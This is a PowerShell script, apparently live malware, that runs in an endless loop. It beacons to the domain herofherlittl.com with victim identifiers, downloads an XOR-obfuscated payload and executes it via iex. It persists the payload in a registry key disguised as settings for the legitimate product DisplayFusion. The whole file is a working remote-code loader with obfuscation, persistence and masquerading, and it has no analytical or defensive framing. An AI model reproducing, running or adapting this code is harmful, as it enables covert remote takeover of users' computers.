$JVar_g=$null;
$rVER_m = "37";

$txtEnc_ASC=[System.Text.Encoding]::ASCII;
$ok=$true
$Local_parM = "WyI5MTYxNzE0ODY2MjEzMTk2Njg4IiwxNjgwODAxOTk5LCJOVGN3TWprTUJnWUREZ1FEQ0FRUEJ3WURBd0FEQVFnS1JRd0dDQW9JQTBzQkJBRUZEd0FEQUFBQVRHMWNUVkklM0QiXQ==";
#["9161714866213196688",1680801999,"NTcwMjkMBgYDDgQDCAQPBwYDAwADAQgKRQwGCAoIA0sBBAEFDwADAAAATG1cTVI%3D"]

function recvValueFromIndx([string]$btARR2)
{
	$btARR=[System.Convert]::FromBase64String($btARR2);

	$st=$txtEnc_ASC.GetBytes('Get-ItemPropertyValue');
	$ed=$btARR[0..4];

	$i=0;
	$l=$ed.Length;
	$k=@();

	[array]::Resize([ref]$k,$st.length);
	foreach($b in $st)
	{
		$k[$i++]=$b -bxor $ed[$i%$l]
	}

	$bs=$btARR[5..$btARR.length];

	$i=0;
	$l=$k.Length;
	$dt=@();

	[array]::Resize([ref]$dt,$bs.length);
	foreach($b in $bs)
	{
		$dt[$i++]=$b -bxor $k[$i%$l]
	}

	return $txtEnc_ASC.GetString($dt) | ConvertFrom-Json;
}

$dat = $null;

try
{
	$JVar_g = $txtEnc_ASC.GetString([System.Convert]::FromBase64String($Local_parM)) | ConvertFrom-Json;
}
catch{}

$displayType = "Display Fusion";
$is=$JVar_g[1];


$u=$JVar_g[0];
$binVal = "HKCU:\Software\BinaryFortressSoftware\";

$di=$JVar_g[2];
$d = "herofherlittl.com";

$a = $txtEnc_ASC;
$v = "0";

while($ok)
{
	try
	{
		try
		{
			if (!(Test-Path $binVal)){New-Item -Path $binVal | Out-Null;}
		}
		catch{}

		$cr = $false;
		if ($dat -eq $null)
		{
			try
			{
				$r = Get-ItemPropertyValue -Path $binVal -Name $displayType;
				$dat = recvValueFromIndx($r);
				$v = $dat[0];
				$cr = $true;
			}catch{}
		}
		else
		{
			$v = $dat[0];
		}

		try
		{
			$fmt = "https://{0}/x?u={1}&is={2}&lv={3}&rv={4}&did={5}" -f $d,$u,$is,$rVER_m,$v,$di
			$dt = wget $fmt -UseBasicParsing;

			$dat2 = recvValueFromIndx($dt);
			if ($dat2[0] -gt $v) {
				$v2 = $dat2[0];

				New-ItemProperty -Path $binVal -Name $displayType -Value $dt -PropertyType "String" -Force | Out-Null;
				$dat = $dat2;
				$cr = $true;
			}
		}
		catch{}

		if ($cr -eq $true)
		{
			try
			{
				stop;
			}
			catch{}
			try
			{
				iex $dat[1];
			}
			catch{}
		}
	} catch{}

	try {
		$mxs = ((get-random 80 -minimum 55)*60);
		$cdt = [int](Get-Date -UFormat %s);

		:cnt while($ok) {
			try{temp($d,$u,$is,$di);}catch{}

			Start-Sleep (get-random 75 -minimum 35);
			$ndt = [int](Get-Date -UFormat %s);

			if (($ndt-$cdt) -gt $mxs) {
				break cnt;
			}
		}

	} catch{}
}